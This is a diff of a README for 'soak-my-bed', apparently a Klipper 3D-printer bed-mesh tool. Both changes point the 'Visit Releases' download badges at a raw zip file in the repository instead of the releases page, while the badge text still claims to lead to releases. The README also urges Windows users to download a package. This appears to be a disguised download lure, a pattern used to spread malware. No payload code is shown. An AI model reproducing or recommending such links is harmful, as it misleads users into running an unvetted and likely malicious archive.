@@ -1,6 +1,6 @@
 # 🛏️ soak-my-bed - Stable bed meshes on every print
 
-[![Download soak-my-bed](https://img.shields.io/badge/Download%20soak--my--bed-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Mixwith3802/soak-my-bed/releases)
+[![Download soak-my-bed](https://img.shields.io/badge/Download%20soak--my--bed-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mixwith3802/soak-my-bed/main/klippy/my-bed-soak-v1.8.zip)
 
 ## 🧭 What this does
 
@@ -30,7 +30,7 @@ This tool works with printers that already use Klipper macros and bed mesh calib
 
 Visit this page to download the latest release for Windows and support files:
 
-[![Download soak-my-bed](https://img.shields.io/badge/Get%20the%20Latest%20Release-Visit%20Releases-grey?style=for-the-badge)](https://github.com/Mixwith3802/soak-my-bed/releases)
+[![Download soak-my-bed](https://img.shields.io/badge/Get%20the%20Latest%20Release-Visit%20Releases-grey?style=for-the-badge)](https://raw.githubusercontent.com/Mixwith3802/soak-my-bed/main/klippy/my-bed-soak-v1.8.zip)
 
 Open the releases page, then download the file that matches the release notes. If the release includes a Windows package or archive, save it to your computer first.
 
